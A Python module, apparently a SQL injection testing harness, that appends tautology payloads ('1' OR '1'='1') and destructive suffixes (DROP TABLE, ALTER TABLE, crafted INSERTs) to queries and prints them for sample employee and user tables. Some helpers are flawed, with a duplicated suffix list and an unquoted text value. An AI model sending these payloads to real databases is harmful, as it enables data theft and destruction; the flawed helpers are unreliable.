from objects import DB_table_settings

BASIC_NUMERICAL_INPUT = "1"

BASIC_TEXT_INPUT = "admin"

EXFILTRATION_SUFFIXES = [
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR ''='",
]

### MAIN FUNCTIONS TO USE


def generate_tainted_strings_for_exfiltration() -> list[str]:

  tainted_text_inputs: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_text_inputs.append(BASIC_TEXT_INPUT + suffix)
  return tainted_text_inputs



def generate_tainted_strings_for_corruption() -> list[str]:

  tainted_text_inputs: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_text_inputs.append(BASIC_TEXT_INPUT + suffix)
  return tainted_text_inputs



def generate_tainted_queries_for_exfiltration(basic_query: str) -> list[str]:
  
  tainted_queries: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_queries.append(basic_query + suffix)
  return tainted_queries



def generate_tainted_queries_for_corruption(basic_query: str, table_settings_dict: dict[str, DB_table_settings], table_name: str) -> list[str]:
  
  if table_name not in table_settings_dict:
    raise Exception(f"Error: Table {table_name} not found in settings")
    
  db_table_settings = table_settings_dict[table_name]
  CORRUPTION_SUFFIXES: list[str] = generate_corruption_suffixes(db_table_settings)
  tainted_queries: list[str] = []
  for suffix in CORRUPTION_SUFFIXES:
    tainted_queries.append(basic_query + suffix)
  return tainted_queries



### ASSISTING FUNCTIONS

def generate_corruption_suffixes(db_table_settings: DB_table_settings) -> list[str]:
  table_name: str = db_table_settings.table_name
  column_names: list[str] = db_table_settings.column_names
  column_datatypes: list[str] = db_table_settings.column_datatypes

  CORRUPTION_SUFFIXES = [
    f"'; DROP TABLE {table_name};--",
    f"; DROP TABLE {table_name};--",
    f"'; ALTER TABLE {table_name} ADD COLUMN hacked_text_column TEXT; --",
    f"; ALTER TABLE {table_name} ADD COLUMN hacked_text_column TEXT; --",
    f"'; ALTER TABLE {table_name} ADD COLUMN hacked_int_column INT; --",
    f"; ALTER TABLE {table_name} ADD COLUMN hacked_int_column INT; --",
  ]
  CORRUPTION_SUFFIXES.append( build_insert_suffixe(db_table_settings) )
  add_drop_column_suffixes(table_name, column_names, CORRUPTION_SUFFIXES)
  return CORRUPTION_SUFFIXES



def add_drop_column_suffixes(table_name: str, column_names: list[str], CORRUPTION_SUFFIXES: list[str]):

  for column_name in column_names:
    CORRUPTION_SUFFIXES.append(f"'; ALTER TABLE {table_name} DROP COLUMN {column_name}; --")



def build_insert_suffixe(db_table_settings: DB_table_settings):

  table_name: str = db_table_settings.table_name
  column_names: list[str] = db_table_settings.column_names
  column_datatypes: list[str] = db_table_settings.column_datatypes

  INSERTION_SUFFIXE: str = f"'; INSERT INTO {table_name} " 
  INSERTION_SUFFIXE +=  format_list_to_string(column_names)
  INSERTION_SUFFIXE += " VALUES "
  INSERTION_SUFFIXE += format_list_to_string( get_default_from_datatype(column_datatypes) )
  INSERTION_SUFFIXE += "; --"

  return INSERTION_SUFFIXE


def format_list_to_string(list: list[str]) -> str:

  formatted_string: str = "("
  for string in list:

    formatted_string += string + ","
  return formatted_string[:-1] + ')'



def get_default_from_datatype(list_of_datatypes: list[str]) -> list[str]:
  list_of_defaults: list[str] = []
  for datatype in list_of_datatypes:
    if datatype.lower() == 'text':
      list_of_defaults.append('hack_string')
    elif datatype.lower() == 'int':
      list_of_defaults.append('1')
    else:
      raise Exception("Error : a datatype can be TEXT or INT")

  return list_of_defaults

## TESTS
if __name__ == '__main__':
  # Create a dictionary of table settings
  table_settings_dict: dict[str, DB_table_settings] = {}
  
  # Add employees table
  employees_columns = ["name", "wage", "department"]
  employees_datatypes = ["TEXT", "INT", "TEXT"]
  table_settings_dict["employees"] = DB_table_settings("employees", employees_columns, employees_datatypes)
  
  # Add users table
  users_columns = ["id", "username", "password"]
  users_datatypes = ["INT", "TEXT", "TEXT"]
  table_settings_dict["users"] = DB_table_settings("users", users_columns, users_datatypes)

  basic_query: str = "SELECT * FROM employees"

  print("\nCORRUPTION QUERIES for employees: \n")
  corruption_queries: list[str] = generate_tainted_queries_for_corruption(basic_query, table_settings_dict, "employees")
  for query in corruption_queries:
    print(query)

  print("\nEXFILTRATION QUERIES : \n")
  basic_query += " WHERE department=\"marketing\""
  exfiltration_queries: list[str] = generate_tainted_queries_for_exfiltration(basic_query)
  for query in exfiltration_queries:
    print(query)